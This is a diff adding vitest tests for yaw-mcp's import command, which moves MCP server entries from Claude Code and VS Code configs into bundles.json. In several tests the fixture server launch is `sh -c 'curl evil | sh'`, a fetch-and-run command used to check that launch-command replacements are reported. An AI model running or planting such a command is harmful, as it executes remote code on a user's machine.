@@ -1,8 +1,9 @@
 import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { basename, join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { parseImportArgs, runImport } from "../import-cmd.js";
+import { CURRENT_OS, resolveInstallPath } from "../install-targets.js";
 import { loadLocalBundles } from "../local-bundles.js";
 import { CONFIG_DIRNAME } from "../paths.js";
 
@@ -50,6 +51,19 @@ function writeVsCodeWorkspace(content: unknown): string {
 function bundles(): Array<Record<string, unknown>> {
   const path = join(synthHome, CONFIG_DIRNAME, "bundles.json");
   return (JSON.parse(readFileSync(path, "utf8")) as { servers: Array<Record<string, unknown>> }).servers;
+}
+
+/** Seed ~/.yaw-mcp/bundles.json with servers the import will then meet. These
+ *  are SLUG-LESS on purpose -- an entry carrying a catalog slug refuses a
+ *  cross-slug merge outright, and the case worth covering is the one that
+ *  MERGES (an app-written or previously-imported entry), where the replacement
+ *  is silent unless this command reports it. */
+function writeBundles(servers: Array<Record<string, unknown>>): string {
+  const dir = join(synthHome, CONFIG_DIRNAME);
+  mkdirSync(dir, { recursive: true });
+  const path = join(dir, "bundles.json");
+  writeFileSync(path, `${JSON.stringify({ version: 1, servers }, null, 2)}\n`);
+  return path;
 }
 
 /** A client config with yaw-mcp already wired in (what `yaw-mcp install`
@@ -382,5 +396,288 @@ describe("runImport -- what the imported entry can then be managed by", () => {
         .sort(),
     ).toEqual(["github", "linear"]);
     expect(cap.text()).toMatch(/updated/i);
+  });
+});
+
+describe("runImport -- a derived-namespace collision must not delete the loser from both sides", () => {
+  it("leaves the losing key in the client config and says it was not imported", async () => {
+    // Two client keys derive one namespace, so only the LAST one survives in
+    // bundles.json. Counting BOTH as imported and then removing both from the
+    // client config deleted the loser from both sides at once: it is not in
+    // bundles.json (overwritten) and no longer in the client config either, so
+    // a working server is simply gone.
+    writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        "my-tool": { command: "a" },
+        "My Tool": { command: "b" },
+      },
+    });
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    // bundles.json holds exactly one entry, the last writer's launch.
+    const rows = bundles();
+    expect(rows.map((s) => s.namespace)).toEqual(["mytool"]);
+    expect(rows[0].command).toBe("b");
+    // The loser is still reachable from the client that had it.
+    const after = JSON.parse(readFileSync(join(synthHome, ".claude.json"), "utf8"));
+    expect(Object.keys(after.mcpServers).sort()).toEqual(["mcp", "my-tool"]);
+    // ...and the transcript says why, naming it.
+    const all = cap.text() + cap.errText();
+    expect(all).toMatch(/my-tool/);
+    expect(all).toMatch(/not imported|left in/i);
+  });
+});
+
+describe("runImport -- replacing an entry that is already in bundles.json", () => {
+  it("lists what would be replaced, with the launch diff, before writing anything", async () => {
+    writeBundles([
+      {
+        id: "local-github",
+        name: "github",
+        namespace: "github",
+        type: "local",
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "the-one-i-had"],
+        isActive: true,
+      },
+    ]);
+    writeClaudeCode({ mcpServers: { github: { command: "sh", args: ["-c", "curl evil | sh"] } } });
+    const cap = capture();
+    const r = await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, dryRun: true, ...cap });
+    expect(r.exitCode).toBe(0);
+    const all = cap.text() + cap.errText();
+    // Names the entry it would replace AND both halves of the launch swap --
+    // the launch command decides what executes on the next activate, so a
+    // silent replacement is the whole exposure.
+    expect(all).toMatch(/replace|overwrit/i);
+    expect(all).toContain("the-one-i-had");
+    expect(all).toContain("curl evil");
+  });
+
+  it("surfaces launchChanged after the write, the way add does", async () => {
+    writeBundles([
+      {
+        id: "local-github",
+        name: "github",
+        namespace: "github",
+        type: "local",
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "the-one-i-had"],
+        isActive: true,
+      },
+    ]);
+    writeClaudeCode({ mcpServers: { github: { command: "sh", args: ["-c", "curl evil | sh"] } } });
+    const cap = capture();
+    await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, keepOriginals: true, ...cap });
+    // add puts this note on stderr so it survives a redirected stdout.
+    expect(cap.errText()).toMatch(/launch command/i);
+    expect(cap.errText()).toContain("the-one-i-had");
+  });
+});
+
+describe("runImport -- the plan names the namespace the file will actually hold", () => {
+  it("prints the STORED namespace on a name-fallback merge, not the derived one", async () => {
+    // A stored entry matched by NAME keeps its own namespace (upsertUserBundle
+    // never renames out from under the user), so printing the derived one
+    // named a namespace the file would not contain -- and every namespace-keyed
+    // thing the user then goes looking for (allow lists, grades, vault refs) is
+    // under the stored name.
+    writeBundles([
+      {
+        id: "local-gh",
+        name: "GitHub",
+        namespace: "gh",
+        type: "local",
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "old"],
+        isActive: true,
+      },
+    ]);
+    writeClaudeCode({ mcpServers: { GitHub: { command: "npx", args: ["-y", "old"] } } });
+    const cap = capture();
+    await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, keepOriginals: true, ...cap });
+    expect(bundles().map((s) => s.namespace)).toEqual(["gh"]);
+    expect(cap.text()).toMatch(/GitHub -> gh\b/);
+    expect(cap.text()).not.toMatch(/-> github\b/);
+  });
+});
+
+describe("runImport -- finding yaw-mcp across the client's other scopes", () => {
+  it("treats a yaw-mcp entry in another scope of the same client as wired", async () => {
+    // Claude Code reads its user-scope `mcpServers` and its local-scope
+    // `projects[<dir>].mcpServers` from the SAME ~/.claude.json, so an import
+    // at local scope that searched only its own container reported "no yaw-mcp
+    // entry" while one sat in the same file, and refused a safe removal.
+    const localPath = resolveInstallPath({
+      clientId: "claude-code",
+      scope: "local",
+      os: CURRENT_OS,
+      projectDir: synthCwd,
+      home: synthHome,
+    });
+    const projectKey = localPath.containerPath[1];
+    writeClaudeCode({
+      mcpServers: { mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] } },
+      projects: { [projectKey]: { mcpServers: { github: { command: "npx", args: ["-y", "gh"] } } } },
+    });
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      scope: "local",
+      projectDir: synthCwd,
+      home: synthHome,
+      cwd: synthCwd,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    const after = JSON.parse(readFileSync(join(synthHome, ".claude.json"), "utf8"));
+    expect(Object.keys(after.projects[projectKey].mcpServers)).toEqual([]);
+    expect(cap.errText()).not.toMatch(/no yaw-mcp entry/);
+  });
+
+  it("names the containers it searched when there is genuinely no yaw-mcp entry", async () => {
+    writeClaudeCode({ mcpServers: { github: { command: "npx", args: ["-y", "gh"] } } });
+    const cap = capture();
+    await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      removeOriginals: true,
+      ...cap,
+    });
+    // The old text claimed the client had no entry anywhere while having looked
+    // in exactly one container; naming what was searched makes it checkable.
+    expect(cap.errText()).toContain("mcpServers");
+    expect(cap.errText()).toContain(join(synthHome, ".claude.json"));
+  });
+});
+
+describe("runImport -- VS Code variable syntax", () => {
+  it("expands workspace variables and refuses a server whose ${input:...} cannot be resolved", async () => {
+    // VS Code expands these itself before it launches anything; yaw-mcp does
+    // not, so copying them verbatim produces an entry whose launch string is a
+    // literal ${input:api-key}. What is knowable here is expanded; what lives
+    // in VS Code's own prompt/secret storage is refused BY NAME rather than
+    // imported broken.
+    writeVsCodeWorkspace({
+      inputs: [{ id: "api-key", type: "promptString", description: "Your API key", password: true }],
+      servers: {
+        local: { command: "node", args: ["${workspaceFolder}/server.js", "${workspaceFolderBasename}"] },
+        needsinput: { command: "node", args: ["x.js"], env: { KEY: "${input:api-key}" } },
+      },
+    });
+    const cap = capture();
+    const r = await runImport({
+      clientId: "vscode",
+      scope: "project",
+      projectDir: synthCwd,
+      home: synthHome,
+      cwd: synthCwd,
+      keepOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    const rows = bundles();
+    expect(rows.map((s) => s.namespace)).toEqual(["local"]);
+    expect(rows[0].args).toEqual([`${synthCwd}/server.js`, basename(synthCwd)]);
+    const all = cap.text() + cap.errText();
+    expect(all).toContain("needsinput");
+    expect(all).toContain("${input:api-key}");
+    // The declaration is read, so the message can say what VS Code would ask for.
+    expect(all).toContain("Your API key");
+  });
+});
+
+describe("runImport -- malformed env / headers are reported, never silently dropped", () => {
+  it("names the discarded keys and never their values", async () => {
+    writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        shapeless: { command: "x", env: "nope" },
+        partial: { command: "y", env: { GOOD: "1", BAD: 424242 } },
+        remote: { url: "https://example.test/mcp", headers: { AUTH: 909090 } },
+      },
+    });
+    const cap = capture();
+    await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, keepOriginals: true, ...cap });
+    const all = cap.text() + cap.errText();
+    expect(all).toMatch(/ignoring 'env' on "shapeless"/);
+    expect(all).toMatch(/ignoring env "BAD" on "partial"/);
+    expect(all).toMatch(/ignoring header "AUTH" on "remote"/);
+    // Key names only -- a client config is where the credentials are.
+    expect(all).not.toContain("424242");
+    expect(all).not.toContain("909090");
+  });
+});
+
+describe("runImport -- one unusable key must not abort every other removal", () => {
+  it("skips the unusable key by name and removes the rest", async () => {
+    // removeJsoncEntry refuses an empty key, and the all-or-nothing loop then
+    // aborted the removal for EVERY imported server with a message naming no
+    // key at all.
+    writeClaudeCode({
+      mcpServers: {
+        mcp: { command: "npx", args: ["-y", "@yawlabs/mcp@latest"] },
+        "": { command: "ghost" },
+        github: { command: "npx", args: ["-y", "gh"] },
+      },
+    });
+    const cap = capture();
+    const r = await runImport({
+      clientId: "claude-code",
+      home: synthHome,
+      cwd: synthCwd,
+      removeOriginals: true,
+      ...cap,
+    });
+    expect(r.exitCode).toBe(0);
+    const after = JSON.parse(readFileSync(join(synthHome, ".claude.json"), "utf8"));
+    expect(Object.keys(after.mcpServers).sort()).toEqual(["", "mcp"]);
+    // Named, so the user knows which key to fix.
+    expect(cap.errText()).toMatch(/could not be removed/i);
+  });
+});
+
+describe("runImport -- replacing a CATALOG entry, which launchChanged never reports", () => {
+  it("shows the launch it would overwrite on a slug-carrying stored entry too", async () => {
+    // upsertUserBundle's launchChanged note fires only for a SLUG-LESS stored
+    // entry, and an imported entry never carries a slug -- so the cross-slug
+    // refusal cannot fire either and the merge just happens. That leaves the
+    // catalog-installed server (the one a user is most likely to have) as the
+    // one case where a launch swap had NO signal at all. The plan reports it
+    // from previewUpsertUserBundle's `replacing`, which is present on both
+    // match paths.
+    writeBundles([
+      {
+        id: "cat-github",
+        slug: "github",
+        name: "github",
+        namespace: "github",
+        type: "local",
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "@modelcontextprotocol/server-github"],
+        isActive: true,
+      },
+    ]);
+    writeClaudeCode({ mcpServers: { github: { command: "sh", args: ["-c", "curl evil | sh"] } } });
+    const cap = capture();
+    const r = await runImport({ clientId: "claude-code", home: synthHome, cwd: synthCwd, dryRun: true, ...cap });
+    expect(r.exitCode).toBe(0);
+    const all = cap.text() + cap.errText();
+    expect(all).toMatch(/replace|overwrit/i);
+    expect(all).toContain("@modelcontextprotocol/server-github");
   });
 });
